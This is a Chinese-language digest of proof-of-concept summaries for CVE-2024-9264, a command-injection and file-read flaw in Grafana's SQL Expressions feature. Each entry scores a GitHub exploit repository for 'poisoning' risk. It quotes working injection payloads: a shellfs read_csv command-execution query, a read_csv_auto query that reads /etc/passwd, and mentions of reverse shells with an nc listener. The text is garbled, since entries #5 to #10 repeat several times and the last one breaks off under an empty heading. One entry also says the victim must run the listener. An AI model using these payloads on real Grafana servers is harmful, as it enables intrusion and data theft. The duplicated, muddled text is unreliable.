**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

